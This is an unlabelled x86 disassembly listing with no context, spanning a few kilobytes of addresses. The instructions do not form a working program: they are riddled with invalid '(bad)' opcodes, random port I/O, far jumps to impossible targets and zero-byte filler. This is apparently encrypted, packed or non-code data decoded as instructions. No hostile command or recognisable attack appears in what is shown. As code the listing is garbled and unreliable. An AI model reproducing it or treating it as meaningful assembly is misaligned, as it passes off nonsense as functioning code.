  439f09:	ja     0x439ec1
  439f0b:	cmc    
  439f0c:	cmp    ah,BYTE PTR [ebp-0x7d0002d7]
  439f12:	test   al,0x50
  439f14:	jmp    FWORD PTR [edx]
  439f16:	sub    al,0x76
  439f18:	push   ebx
  439f19:	xor    DWORD PTR [edx+0x1e0eefa8],0xa0754772
  439f23:	rcl    bl,0xfe
  439f26:	out    dx,al
  439f27:	dec    edi
  439f28:	test   DWORD PTR [eax+0x1173777b],esi
  439f2e:	mov    dl,0x3e
  439f30:	es mov bh,0xa3
  439f33:	mov    eax,0xfcac7a0e
  439f38:	test   BYTE PTR [ebp+0x5e35de02],ch
  439f3e:	or     BYTE PTR [ecx+0x90282bf],ah
  439f44:	jnp    0x439f7c
  439f46:	adc    BYTE PTR [esi+0x1a],bh
  439f49:	aas    
  439f4a:	adc    al,0x6e
  439f4c:	mov    edi,0x43205ca
  439f51:	clc    
  439f52:	mov    DWORD PTR [esi-0x24774aff],0xf6c7fafb
  439f5c:	js     0x439f5e
  439f5e:	add    BYTE PTR [eax],al
  439f60:	add    BYTE PTR [eax],al
  439f62:	cs push esi
  439f64:	sar    DWORD PTR [eax+0x79],0xa
  439f68:	leave  
  439f69:	jp     0x439fa1
  439f6b:	adc    BYTE PTR [esi],bh
  439f6d:	cli    
  439f6e:	push   ecx
  439f6f:	dec    ebx
  439f70:	sub    DWORD PTR [edi+0x7ac0a26a],edi
  439f76:	mov    esi,0x90395e10
  439f7b:	dec    eax
  439f7c:	pop    esi
  439f7d:	cmp    eax,0x8a1eb6f8
  439f82:	pop    edx
  439f83:	xor    eax,0x204003e7
  439f88:	pop    esi
  439f89:	mov    bh,0x46
  439f8b:	push   ecx
  439f8c:	cli    
  439f8d:	js     0x439f3d
  439f8f:	sub    dh,BYTE PTR [eax-0x41]
  439f92:	xor    al,BYTE PTR [edi+0x2756eb3]
  439f98:	out    0x3,eax
  439f9a:	sub    BYTE PTR ds:0x88ebf85c,ch
  439fa0:	fs hlt 
  439fa2:	out    dx,eax
  439fa3:	cwde   
  439fa4:	out    0x3,eax
  439fa6:	jne    0x439faa
  439fa8:	(bad)  
  439fa9:	xor    eax,0xa604050
  439fae:	xchg   BYTE PTR [edx],bh
  439fb0:	je     0x439f6a
  439fb2:	std    
  439fb3:	jns    0x439f9d
  439fb5:	add    esi,DWORD PTR [ebp+0x2]
  439fb8:	add    BYTE PTR [edx-0x4eb480aa],bl
  439fbe:	arpl   WORD PTR [ebp+0x74],si
  439fc1:	hlt    
  439fc2:	arpl   WORD PTR [esi+0x24],bx
  439fc5:	jmp    0x439fca
  439fca:	add    BYTE PTR [esi+0x2],dh
  439fcd:	add    BYTE PTR [eax+0x14bf812e],bh
  439fd3:	das    
  439fd4:	add    eax,0x5087c2fd
  439fda:	jle    0x43a031
  439fdc:	inc    ebp
  439fdd:	std    
  439fde:	cwde   
  439fdf:	das    
  439fe0:	shl    edi,1
  439fe2:	and    BYTE PTR [ecx+0x76614341],0x2
  439fe9:	add    cl,ch
  439feb:	cmc    
  439fec:	shr    bh,0xeb
  439fef:	(bad)  
  439ff0:	cmp    bh,cl
  439ff2:	jmp    0xad42406d
  439ff7:	shl    DWORD PTR [eax+0x73],cl
  439ffa:	xlat   BYTE PTR ds:[ebx]
  439ffb:	jge    0x439fd4
  439ffd:	jmp    0x439fe5
  439fff:	jmp    0x4b7d:0x76e9003d
  43a006:	sbb    DWORD PTR [ecx+0x73],esp
  43a009:	(bad)  
  43a00b:	adc    ecx,DWORD PTR [eax]
  43a00d:	or     DWORD PTR [esi+0x52],ebx
  43a010:	les    esi,FWORD PTR [esp+ebp*4]
  43a013:	mov    edx,0xb1dd8209
  43a018:	cmp    ecx,edi
  43a01a:	jb     0x43a05f
  43a01c:	dec    eax
  43a01d:	sbb    eax,0x737bbe7c
  43a022:	and    eax,0xf6cfaf6d
  43a027:	repnz xor al,0xfa
  43a02a:	fidiv  WORD PTR [esi+0xdd537d]
  43a030:	add    BYTE PTR [eax],al
  43a032:	add    BYTE PTR [eax],al
  43a034:	cld    
  43a035:	inc    esp
  43a036:	jae    0x43a019
  43a038:	repz (bad) 
  43a03a:	sti    
  43a03b:	add    BYTE PTR [ebp+0xd8bed51],al
  43a041:	test   BYTE PTR ds:0xc15157e8,bh
  43a047:	(bad)  
  43a048:	fadd   DWORD PTR [edi-0x3a38347d]
  43a04e:	add    BYTE PTR [ebp-0x1c],0xb6
  43a052:	clc    
  43a053:	(bad)  
  43a054:	fdiv   st(7),st
  43a056:	cli    
  43a057:	sar    bh,1
  43a059:	fidiv  WORD PTR [edx]
  43a05b:	push   ebp
  43a05c:	loopne 0x43a0c9
  43a05e:	push   ss
  43a05f:	lea    ebp,[eax-0x6c6f62a6]
  43a065:	mov    eax,0x89db2b35
  43a06a:	sar    BYTE PTR [esi-0x60],0x3d
  43a06e:	cmp    al,BYTE PTR [ebx-0x400503a6]
  43a074:	addr16 pop ecx
  43a076:	in     eax,0x72
  43a078:	aaa    
  43a079:	sub    DWORD PTR [ebp-0x3c],0x7
  43a07d:	pop    ecx
  43a07e:	ror    DWORD PTR [ebx+0x1b70719],1
  43a084:	pop    esp
  43a085:	(bad)  
  43a086:	call   edx
  43a088:	mov    ebx,0x1189cefb
  43a08d:	retf   
  43a08e:	adc    BYTE PTR [ebp-0x4c],0x7b
  43a092:	clc    
  43a093:	add    ecx,ebp
  43a095:	push   es
  43a096:	jns    0x43a092
  43a098:	add    BYTE PTR [eax],al
  43a09a:	add    BYTE PTR [eax],al
  43a09c:	add    BYTE PTR [eax],cl
  43a09e:	cld    
  43a09f:	(bad)  
  43a0a0:	jmp    DWORD PTR [edi+0x3]
  43a0a3:	jnp    0x43a09d
  43a0a5:	push   ds
  43a0a6:	jp     0x43a0a9
  43a0a8:	and    DWORD PTR [esi],0xcfffb4f
  43a0ae:	ins    BYTE PTR es:[edi],dx
  43a0af:	arpl   WORD PTR [ebx+0x146d83da],cx
  43a0b5:	xchg   DWORD PTR [ecx],ecx
  43a0b7:	mov    BYTE PTR [esi*2-0x10f57647],cl
  43a0be:	fnstsw WORD PTR [edi]
  43a0c0:	mov    BYTE PTR [ecx+0x7b8503da],dh
  43a0c6:	mov    al,0xcf
  43a0c8:	out    0x9e,eax
  43a0ca:	popa   
  43a0cb:	inc    esp
  43a0cc:	div    DWORD PTR [edi-0x5e]
  43a0cf:	xlat   BYTE PTR ds:[ebx]
  43a0d0:	iret   
  43a0d1:	push   ebx
  43a0d2:	mov    dl,0xc8
  43a0d4:	(bad)  
  43a0d5:	ja     0x43a069
  43a0d7:	mov    ds:0x8a8bcaf9,eax
  43a0dc:	inc    ebx
  43a0dd:	mov    ebp,0x5c743c9d
  43a0e2:	dec    edi
  43a0e3:	loopne 0x43a0d8
  43a0e5:	xchg   di,ax
  43a0e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a0e8:	xchg   BYTE PTR [eax+0x57],al
  43a0eb:	mov    dl,BYTE PTR [ebx-0x73]
  43a0ee:	pop    edx
  43a0ef:	enter  0x350f,0xb1
  43a0f3:	fisttp WORD PTR [esi]
  43a0f5:	(bad)  
  43a0f6:	gs or  eax,0x89a77987
  43a0fc:	inc    ebx
  43a0fd:	popf   
  43a0fe:	lahf   
  43a0ff:	xlat   BYTE PTR ds:[ebx]
  43a100:	sti    
  43a101:	add    BYTE PTR [eax],al
  43a103:	add    BYTE PTR [eax],al
  43a105:	add    al,ch
  43a107:	sub    al,0x88
  43a109:	add    BYTE PTR [ebp+0x1b],dh
  43a10c:	std    
  43a10d:	test   BYTE PTR [eax-0x11f7fbb1],dh
  43a113:	adc    ax,0xba55
  43a117:	mov    dl,0xc
  43a119:	sub    eax,0xe38a7235
  43a11e:	test   al,0xdc
  43a120:	fstp   DWORD PTR [eax-0x3]
  43a123:	sbb    bh,ch
  43a125:	push   DWORD PTR [ebp+0x69]
  43a128:	mov    ah,bl
  43a12a:	rcr    ah,1
  43a12c:	mov    ecx,edi
  43a12e:	shl    BYTE PTR [eax+ebp*1+0x30c117f],0x0
  43a136:	jne    0x43a13a
  43a138:	mov    al,cl
  43a13a:	rol    ch,cl
  43a13c:	out    0xf4,al
  43a13e:	aaa    
  43a13f:	jl     0x43a16d
  43a141:	inc    eax
  43a142:	cli    
  43a143:	xchg   edi,eax
  43a145:	aas    
  43a146:	cld    
  43a147:	xor    DWORD PTR [eax-0x71],esi
  43a14a:	shr    DWORD PTR [edi],1
  43a14c:	mov    edx,0x8f97f241
  43a151:	aas    
  43a152:	fdiv   QWORD PTR [ecx]
  43a154:	pusha  
  43a155:	lahf   
  43a156:	shr    DWORD PTR [edi],0xa2
  43a159:	inc    ecx
  43a15a:	cli    
  43a15b:	ja     0x43a114
  43a15d:	aas    
  43a15e:	int3   
  43a15f:	xor    DWORD PTR [eax+0x7f],esp
  43a162:	mov    cl,0x2f
  43a164:	mov    al,BYTE PTR [ecx+0x57]
  43a167:	jle    0x43a1c5
  43a169:	cmp    al,0x0
  43a16b:	add    BYTE PTR [eax],al
  43a16d:	add    BYTE PTR [eax],al
  43a16f:	scas   al,BYTE PTR es:[edi]
  43a170:	xor    DWORD PTR [edx-0x56],edi
  43a173:	(bad)  
  43a174:	jg     0x43a0f9
  43a176:	aas    
  43a177:	pushf  
  43a178:	xor    DWORD PTR [ecx],eax
  43a17a:	nop
  43a17b:	(bad)  
  43a17c:	cmp    ah,BYTE PTR [ecx+eax*2-0x74]
  43a180:	test   al,0x6a
  43a182:	xchg   DWORD PTR [ecx+0x1741522f],esi
  43a188:	jle    0x43a10e
  43a18a:	inc    esp
  43a18b:	jle    0x43a1be
  43a18d:	inc    edx
  43a18e:	stos   BYTE PTR es:[edi],al
  43a18f:	(bad)  
  43a190:	pop    esi
  43a191:	jnp    0x43a1d2
  43a193:	ins    BYTE PTR es:[edi],dx
  43a194:	xor    DWORD PTR [ebx-0x6f],edx
  43a197:	div    BYTE PTR [ecx]
  43a199:	sub    al,0x41
  43a19b:	pop    esp
  43a19c:	jge    0x43a14a
  43a19e:	pop    es
  43a19f:	cli    
  43a1a0:	xchg   BYTE PTR [edi],cl
  43a1a2:	aas    
  43a1a3:	dec    esp
  43a1a4:	xor    DWORD PTR [edi+eax*8+0x76],esp
  43a1a8:	dec    ecx
  43a1a9:	fs hlt 
  43a1ab:	aas    
  43a1ac:	xor    DWORD PTR [edx],eax
  43a1ae:	add    esi,DWORD PTR [ebp+0x3]
  43a1b1:	out    0x8a,eax
  43a1b3:	div    BYTE PTR ds:0x2bb5f400
  43a1b9:	test   DWORD PTR [ecx+0x34df9a5a],ebp
  43a1bf:	cmp    DWORD PTR [ecx],esi
  43a1c1:	mov    BYTE PTR [edx+edx*2+0x2d],ah
  43a1c5:	stc    
  43a1c6:	(bad)  
  43a1c7:	mov    ch,0x15
  43a1c9:	cld    
  43a1ca:	clc    
  43a1cb:	xor    DWORD PTR ss:[esi-0x3520cacc],eax
  43a1d2:	rol    DWORD PTR [eax],1
  43a1d4:	add    BYTE PTR [eax],al
  43a1d6:	add    BYTE PTR [eax],al
  43a1d8:	test   DWORD PTR [edx],eax
  43a1da:	add    cl,ch
  43a1dc:	das    
  43a1dd:	outs   dx,DWORD PTR ds:[esi]
  43a1de:	test   DWORD PTR [esi+0x44ec85c3],ebp
  43a1e4:	sahf   
  43a1e5:	mov    ebx,0x3e359ef8
  43a1ea:	int3   
  43a1eb:	shl    BYTE PTR [ebx-0x3a],cl
  43a1ee:	mov    edi,0xfcb5712a
  43a1f3:	stos   BYTE PTR es:[edi],al
  43a1f4:	jbe    0x43a1f8
  43a1f6:	out    0xa3,eax
  43a1f8:	jl     0x43a1fc
  43a1fa:	add    BYTE PTR [edx+0x35],ah
  43a1fd:	aam    0x84
  43a1ff:	jnp    0x43a19a
  43a201:	outs   dx,DWORD PTR ds:[esi]
  43a202:	je     0x43a202
  43a204:	sti    
  43a205:	xor    esi,DWORD PTR [edx+edi*8-0x5f]
  43a209:	test   ecx,edi
  43a20b:	arpl   WORD PTR [edi-0x78],bx
  43a20e:	adc    BYTE PTR [ecx+0x5e],ah
  43a211:	mov    esp,0xf136d887
  43a216:	xor    BYTE PTR [edi],0x23
  43a219:	and    DWORD PTR [ebp-0x69],edx
  43a21c:	mov    ecx,0xaa1dcc3e
  43a221:	ds int3 
  43a223:	xor    eax,0x2dcc3ec2
  43a228:	mov    edx,0xb562cc3e
  43a22d:	rol    DWORD PTR [ebp+edi*8+0x538724],cl
  43a234:	and    al,0x4b
  43a236:	test   al,bh
  43a238:	aaa    
  43a239:	out    dx,al
  43a23a:	ins    DWORD PTR es:[edi],dx
  43a23b:	outs   dx,BYTE PTR ds:[esi]
  43a23c:	add    BYTE PTR [eax],al
  43a23e:	add    BYTE PTR [eax],al
  43a240:	add    BYTE PTR [edi+0x108d0540],dl
  43a246:	dec    BYTE PTR [edx-0x77]
  43a249:	popa   
  43a24a:	ret    0xeb4d
  43a24d:	pop    ds
  43a24e:	xchg   ebx,eax
  43a24f:	inc    ecx
  43a250:	add    BYTE PTR [edi-0x39740a97],dl
  43a256:	sub    esi,eax
  43a258:	ja     0x43a1dc
  43a25a:	xchg   ecx,eax
  43a25b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a25c:	and    al,0xdc
  43a25e:	add    eax,DWORD PTR [eax]
  43a260:	add    BYTE PTR [edi+0x51],dl
  43a263:	or     eax,0xf8558253
  43a268:	push   ebp
  43a269:	int3   
  43a26a:	test   ah,al
  43a26c:	or     al,0x51
  43a26e:	(bad)  
  43a26f:	jne    0x43a273
  43a271:	push   edi
  43a272:	sar    dl,1
  43a274:	je     0x43a20e
  43a276:	sub    al,0xf0
  43a278:	jbe    0x43a27d
  43a27a:	jl     0x43a2c1
  43a27c:	or     al,0x27
  43a27e:	dec    ecx
  43a27f:	add    DWORD PTR [ebx+0x3bbf7b1d],ecx
  43a285:	jmp    0x43a2f1
  43a287:	sbb    BYTE PTR [ebp-0x74eb95bb],al
  43a28d:	inc    edi
  43a28e:	sbb    ecx,eax
  43a290:	nop
  43a291:	push   ss
  43a292:	push   cs
  43a293:	adc    BYTE PTR [ecx*4+0x2a011c7b],0x7b
  43a29b:	adc    BYTE PTR [eax-0x2f],al
  43a29e:	clc    
  43a29f:	ins    BYTE PTR es:[edi],dx
  43a2a0:	lock xlat BYTE PTR ds:[ebx]
  43a2a2:	push   ecx
  43a2a3:	add    eax,0x8b
  43a2a8:	add    BYTE PTR [eax],al
  43a2aa:	add    ebx,edi
  43a2ac:	and    bh,cl
  43a2ae:	push   edi
  43a2af:	jmp    0x4c4e4722
  43a2b4:	pop    eax
  43a2b5:	mov    esi,DWORD PTR [ebp-0x2]
  43a2b8:	fidivr WORD PTR [ecx+ebp*1+0x41cc500d]
  43a2bf:	cmc    
  43a2c0:	dec    edi
  43a2c1:	int3   
  43a2c2:	cmp    ebp,ebx
  43a2c4:	dec    edi
  43a2c5:	int3   
  43a2c6:	xor    DWORD PTR [eax+edi*1-0x7bd311ad],esp
  43a2cd:	in     al,dx
  43a2ce:	jne    0x43a2ea
  43a2d0:	std    
  43a2d1:	jmp    DWORD PTR [esi-0x55f8204c]
  43a2d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a2d8:	mov    edi,0xb873f00b
  43a2dd:	daa    
  43a2de:	clc    
  43a2df:	inc    edi
  43a2e0:	mov    cl,0x23
  43a2e2:	jmp    0xa719:0x3511c555
  43a2e9:	dec    DWORD PTR [ecx+ebx*1-0x59]
  43a2ed:	call   FWORD PTR [ecx+ebx*1-0x59]
  43a2f1:	push   DWORD PTR [ebx+0x75001318]
  43a2f7:	sbb    DWORD PTR ds:0x3a7fbbeb,esp
  43a2fd:	jge    0x43a2b8
  43a2ff:	dec    esp
  43a300:	ficom  DWORD PTR [esi+edi*8-0x7b]
  43a304:	loopne 0x43a2c2
  43a306:	dec    ebx
  43a307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43a308:	mov    bh,0xf
  43a30a:	lock mov dh,0xb2
  43a30d:	add    DWORD PTR [eax],eax
  43a30f:	add    BYTE PTR [eax],al
  43a311:	add    BYTE PTR [eax],al
  43a313:	mul    BYTE PTR ds:0x6000011
  43a319:	cmp    DWORD PTR [ebx],edx
  43a31b:	sub    eax,0xcffbd2f
  43a320:	sbb    DWORD PTR [edi-0x58e42301],esp
  43a326:	(bad)  
  43a327:	fcomp  QWORD PTR [ebx]
  43a329:	inc    edx
  43a32a:	add    BYTE PTR [ebx+0x4dfffd1b],cl
  43a330:	mov    cl,0x3a
  43a332:	stc    
  43a333:	push   edx
  43a334:	add    esp,DWORD PTR [esi+0x47]
  43a337:	popa   
  43a338:	int3   
  43a339:	mov    ecx,0xb427f9da
  43a33e:	inc    edx
  43a33f:	mov    eax,0x26b1e52d
  43a344:	mov    esi,0x22f6ef1
  43a349:	inc    BYTE PTR [ebp-0x4a]
  43a34c:	ss out 0x3,eax
  43a34f:	jne    0x43a353
  43a351:	pusha  
  43a352:	loopne 0x43a362
  43a354:	jl     0x43a3ba
  43a356:	cmp    al,0xfe
  43a358:	mov    edi,esp
  43a35a:	add    esi,DWORD PTR [ebp+0x2]
  43a35d:	pop    esi
  43a35e:	inc    ebp
  43a35f:	push   eax
  43a360:	inc    ecx
  43a361:	push   ss
  43a362:	push   edx
  43a363:	in     al,0x34
  43a365:	daa    
  43a366:	sub    ebp,0xf81b31fa
  43a36c:	(bad)  
  43a36d:	into   
  43a36e:	mov    BYTE PTR [esi],ch
  43a370:	push   ss
  43a371:	pop    ss
  43a372:	shl    DWORD PTR [ecx+edx*8],cl
  43a375:	ins    DWORD PTR es:[edi],dx
  43a376:	inc    ebp
  43a377:	add    BYTE PTR [eax],al
  43a379:	add    BYTE PTR [eax],al
  43a37b:	add    ch,bl
  43a37d:	inc    ebx
  43a37e:	cdq    
  43a37f:	cmp    eax,0x14ab81bc
  43a384:	ror    BYTE PTR [eax+ebp*8+0x1c797503],cl
  43a38b:	sbb    al,0xba
  43a38d:	sbb    ch,dl
  43a38f:	ins    BYTE PTR es:[edi],dx
  43a390:	mov    bh,0x1
  43a392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43a393:	mov    DWORD PTR [ebp-0x722dea2c],esp
  43a399:	xlat   BYTE PTR ds:[ebx]
  43a39a:	cli    
  43a39b:	xor    BYTE PTR [ecx-0xbb9c02],0xfd
  43a3a2:	pop    ebp
  43a3a3:	xlat   BYTE PTR ds:[ebx]
  43a3a4:	push   0x79
  43a3a6:	sbb    DWORD PTR [ecx+0x3dcb1a30],ecx
  43a3ac:	ins    BYTE PTR es:[edi],dx
  43a3ad:	sub    eax,0xd58ac76e
  43a3b2:	call   FWORD PTR [ecx-0x2aacd5ba]
  43a3b8:	cmc    
  43a3b9:	inc    ebp
  43a3ba:	or     al,0x6c
  43a3bc:	mov    cl,0xa8
  43a3be:	or     esi,DWORD PTR [edx+0x2a]
  43a3c1:	std    
  43a3c2:	test   BYTE PTR [esi],ah
  43a3c4:	in     al,dx
  43a3c5:	outs   dx,BYTE PTR ds:[esi]
  43a3c6:	call   0xf96f146c
  43a3cb:	jb     0x43a407
  43a3cd:	adc    eax,0x2a479751
  43a3d2:	push   ebx
  43a3d3:	(bad)  
  43a3d5:	inc    ebp
  43a3d6:	or     al,0x64
  43a3d8:	mov    ecx,0x23720ba8
  43a3dd:	std    
  43a3de:	test   BYTE PTR [esi+0x0],ch
  43a3e4:	add    ch,ch
  43a3e6:	aas    
  43a3e7:	call   0xf96edef1
  43a3ec:	adc    ah,BYTE PTR [eax+esi*4-0x33415ec]
  43a3f3:	xor    al,0x9f
  43a3f5:	and    eax,0x791c8511
  43a3fa:	ror    BYTE PTR [ebx+ebx*1-0x70],1
  43a3fe:	rcl    DWORD PTR [ebx],1
  43a400:	push   0x32
  43a402:	inc    BYTE PTR [edx+0x352400a9]
  43a408:	call   0xf789:0x2bfd0801
  43a40f:	pop    edx
  43a410:	and    ecx,0x8124850f
  43a416:	ror    BYTE PTR [ecx+ebx*1+0x58],1
  43a41a:	rcl    DWORD PTR [ebx],1
  43a41c:	push   0x3a
  43a41e:	inc    BYTE PTR [edx-0x1adb37d7]
  43a424:	jmp    0xfcba:0x1ffc4f3
  43a42b:	xor    al,0x4f
  43a42d:	sub    ah,bh
  43a42f:	test   BYTE PTR [eax],al
  43a431:	and    DWORD PTR [eax],ecx
  43a433:	dec    esi
  43a434:	push   edi
  43a435:	std    
  43a436:	out    dx,al
  43a437:	dec    esp
  43a438:	adc    al,0xcf
  43a43a:	ret    
  43a43b:	or     eax,DWORD PTR [ebp+0x3be26e9c]
  43a441:	mov    bl,0x76
  43a443:	xor    cl,BYTE PTR [ebx-0x387ceff7]
  43a449:	add    BYTE PTR [eax],al
  43a44b:	add    BYTE PTR [eax],al
  43a44d:	add    al,bl
  43a44f:	and    al,BYTE PTR [ebx+ecx*8-0x76be40c9]
  43a456:	or     eax,esi
  43a458:	push   es
  43a459:	mov    dh,0x48
  43a45b:	add    DWORD PTR [eax-0x5200e8ab],ecx
  43a461:	adc    BYTE PTR [ebx+edx*1+0x51ea0ef9],dl
  43a468:	add    al,0x88
  43a46a:	cld    
  43a46b:	jl     0x43a4ba
  43a46d:	lock dec esp
  43a46f:	or     edx,0xf02bbd75
  43a475:	mulps  xmm5,XMMWORD PTR [edi-0x8]
  43a479:	jmp    DWORD PTR [ebx]
  43a47b:	jl     0x43a468
  43a47d:	jmp    0x3a8c1e
  43a482:	fild   QWORD PTR [edx+0x9]
  43a485:	cmp    ebp,ebx
  43a487:	jae    0x43a4a7
  43a489:	jmp    0x43a45a
  43a48b:	jp     0x43a4ce
  43a48d:	add    BYTE PTR [edi+0x23b096a],dh
  43a493:	jno    0x43a4a7
  43a495:	mov    ebx,DWORD PTR [ecx+0xe]
  43a498:	dec    esi
  43a499:	push   edi
  43a49a:	jl     0x43a483
  43a49c:	dec    esp
  43a49d:	adc    al,0xf
  43a49f:	ret    0x850b
  43a4a2:	fdiv   QWORD PTR [edx-0x1e]
  43a4a5:	cmp    ebp,DWORD PTR [ebx]
  43a4a7:	je     0x43a4c1
  43a4a9:	jmp    0x43a43a
  43a4ab:	jp     0x43a4ee
  43a4ad:	add    BYTE PTR [ebp+0x0],dh
  43a4b0:	mov    bh,0xf
  43a4b2:	add    BYTE PTR [eax],al
  43a4b4:	add    BYTE PTR [eax],al
  43a4b6:	add    dh,bh
  43a4b8:	xor    DWORD PTR gs:0x85126b6d,esi
  43a4bf:	mov    al,0x21
  43a4c1:	iret   
  43a4c2:	push   eax
  43a4c3:	(bad)  
  43a4c4:	hlt    
  43a4c5:	into   
  43a4c6:	adc    esi,esi
  43a4c8:	in     al,0x7
  43a4ca:	xor    DWORD PTR ds:0xb8851f8d,0xd
  43a4d1:	mov    DWORD PTR [ebx+0x3d],edx
  43a4d4:	mov    al,ds:0x402a8549
  43a4d9:	dec    edx
  43a4da:	and    eax,0x7c344025
  43a4df:	dec    esi
  43a4e0:	inc    eax
  43a4e1:	ds ins DWORD PTR es:[edi],dx
  43a4e3:	and    BYTE PTR [eax-0x5b030c3a],0x86
  43a4ea:	js     0x43a4f6
  43a4ec:	and    al,0x36
  43a4ee:	xchg   ecx,eax
  43a4f0:	popf   
  43a4f1:	cld    
  43a4f2:	clc    
  43a4f3:	cli    
  43a4f4:	push   ebx
  43a4f5:	les    eax,FWORD PTR [esi-0x2a05aac0]
  43a4fb:	data16 add cl,BYTE PTR [ecx-0x50502285]
  43a502:	paddsb mm2,QWORD PTR ds:0x5b5ce738
  43a509:	ss stc 
  43a50b:	mov    ?,WORD PTR [edi]
  43a50d:	mov    dl,0x12
  43a50f:	out    dx,al
  43a510:	(bad)  [edi]
  43a512:	xchg   ecx,ebx
  43a514:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a515:	mov    ah,0xf8
  43a517:	mov    dl,0x7b
  43a519:	mov    WORD PTR [eax+eax*1+0x0],ss
  43a520:	clc    
  43a521:	sbb    BYTE PTR [esi],dh
  43a523:	stc    
  43a524:	mov    ds:0xa14b8ad9,al
  43a529:	outs   dx,DWORD PTR ds:[esi]
  43a52a:	ds ins DWORD PTR es:[edi],dx
  43a52c:	and    DWORD PTR [eax+0x1fefbd7],0xffffffdc
  43a533:	adc    edi,edx
  43a535:	lods   al,BYTE PTR ds:[esi]
  43a536:	pop    esi
  43a537:	sub    al,0x3f
  43a539:	sub    al,0x52
  43a53b:	cmp    bh,al
  43a53d:	scas   eax,DWORD PTR es:[edi]
  43a53e:	test   BYTE PTR [esi+0x2b662eb6],0x62
  43a545:	jnp    0x43a4eb
  43a547:	das    
  43a548:	ins    BYTE PTR es:[edi],dx
  43a549:	jp     0x43a535
  43a54b:	cmp    DWORD PTR [edx+ebp*1+0x5e],ecx
  43a54f:	(bad)  
  43a550:	imul   BYTE PTR [edx+0x7e3c3a21]
  43a556:	arpl   WORD PTR [eax+0x3a122975],ax
  43a55c:	cli    
  43a55d:	iret   
  43a55e:	or     cl,BYTE PTR [esi+esi*4-0x7a291d6]
  43a565:	sub    dl,BYTE PTR [eax]
  43a567:	or     bl,BYTE PTR [edi]
  43a569:	sub    dh,dl
  43a56b:	inc    esi
  43a56c:	inc    ecx
  43a56d:	aaa    
  43a56e:	xchg   esi,eax
  43a56f:	shl    DWORD PTR [ebp+0x72e03b7d],1
  43a575:	jge    0x43a59a
  43a577:	loopne 0x43a5df
  43a579:	jge    0x43a59e
  43a57b:	loopne 0x43a507
  43a57d:	iret   
  43a57e:	xor    al,0xd4
  43a580:	cmp    edx,ebx
  43a582:	dec    esi
  43a583:	pusha  
  43a584:	add    BYTE PTR [eax],al
  43a586:	add    BYTE PTR [eax],al
  43a588:	add    BYTE PTR [esi-0x3b],cl
  43a58b:	out    0x9f,al
  43a58d:	fucomp st(7)
  43a58f:	out    0x3,al
  43a591:	jne    0x43a595
  43a593:	mov    al,al
  43a595:	or     al,dh
  43a597:	out    0xf4,al
  43a599:	mov    dh,0x7b
  43a59b:	and    esp,eax
  43a59d:	jb     0x43a53d
  43a59f:	pop    edi
  43a5a0:	fbstp  TBYTE PTR [edx-0xffc18d7]
  43a5a6:	mov    esi,0xcaf9f3ca
  43a5ab:	out    dx,al
  43a5ac:	mov    WORD PTR [ecx],gs
  43a5ae:	fdivp  st(7),st
  43a5b0:	les    ecx,FWORD PTR [ecx+0x72f98510]
  43a5b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a5b7:	stc    
  43a5b8:	(bad)
  43a5bc:	mov    ch,0x9a
  43a5be:	cmc    
  43a5bf:	jl     0x43a614
  43a5c1:	scas   eax,DWORD PTR es:[edi]
  43a5c2:	scas   al,BYTE PTR es:[edi]
  43a5c3:	add    edx,DWORD PTR [edx]
  43a5c5:	mov    ds:0x657429b4,eax
  43a5ca:	mov    bl,0x8a
  43a5cc:	popf   
  43a5cd:	loope  0x43a5e1
  43a5cf:	test   edx,esp
  43a5d1:	(bad)  
  43a5d2:	mov    ecx,0x5086a0b
  43a5d7:	add    BYTE PTR [edx+edi*4+0x76e7fe9a],bl
  43a5de:	add    al,BYTE PTR [ebp-0x59e58156]
  43a5e4:	in     eax,0x76
  43a5e6:	add    dh,BYTE PTR [edi+0x276e8]
  43a5ec:	jb     0x43a5ee
  43a5ee:	add    BYTE PTR [eax],al
  43a5f0:	add    BYTE PTR [eax],al
  43a5f2:	xor    BYTE PTR [ecx],al
  43a5f4:	call   0x461b2e
  43a5f9:	add    al,BYTE PTR [ecx+0x76ec889e]
  43a5ff:	add    al,BYTE PTR [eax]
  43a601:	jmp    0x365be3f7
  43a606:	iret   
  43a607:	int    0xbc
  43a609:	bound  esi,QWORD PTR [edx-0x4841fc1c]
  43a60f:	add    al,0x2
  43a611:	jmp    0xe8fba88c
  43a616:	jbe    0x43a61a
  43a618:	add    BYTE PTR ds:0xcd447dc0,dh
  43a61e:	outs   dx,BYTE PTR ds:[esi]
  43a61f:	jg     0x43a669
  43a621:	icebp  
  43a622:	rol    DWORD PTR [eax-0x18],0x95
  43a626:	jno    0x43a653
  43a628:	stc    
  43a629:	xor    al,0xf8
  43a62b:	cdq    
  43a62c:	pop    ss
  43a62d:	add    bl,bh
  43a62f:	je     0x43a636
  43a631:	call   FWORD PTR [esp+edx*1-0x234f8f09]
  43a638:	xor    eax,0x7aea1bff
  43a63d:	les    ecx,FWORD PTR [eax+0x7044844f]
  43a643:	test   BYTE PTR [edx-0x7ef17fac],0x2
  43a64a:	add    al,0xff
  43a64c:	(bad)  
  43a64d:	dec    DWORD PTR [edi+edi*4+0x4c]
  43a651:	mov    ecx,DWORD PTR [eax]
  43a653:	dec    eax
  43a654:	add    DWORD PTR [ebx+0x0],ecx
  43a65a:	add    BYTE PTR [ebp-0x17],dh
  43a65d:	push   0x11749b1c
  43a662:	(bad)  
  43a663:	fstp   QWORD PTR [ebx]
  43a665:	loope  0x43a67c
  43a667:	pop    ebx
  43a668:	jmp    0xc254:0xff6083f6
  43a66f:	adc    BYTE PTR [ecx*2-0x7bb0fcaa],al
  43a676:	jmp    0xcdcf:0xdb2ac3df
  43a67d:	sub    dh,dh
  43a67f:	iret   
  43a680:	jmp    0x5d57:0x4fb7d1f6
  43a687:	iret   
  43a688:	jnp    0x43a66c
  43a68a:	mov    ecx,ebp
  43a68c:	jnp    0x43a647
  43a68e:	push   0xffffffdd
  43a690:	(bad)  
  43a692:	add    ecx,esp
  43a694:	add    ebp,DWORD PTR [ebx]
  43a696:	rcr    bh,0xcc
  43a699:	sub    cl,cl
  43a69b:	iret   
  43a69c:	shr    DWORD PTR [edx],1
  43a69e:	call   FWORD PTR [ebx]
  43a6a0:	or     DWORD PTR [ebp-0x75],ecx
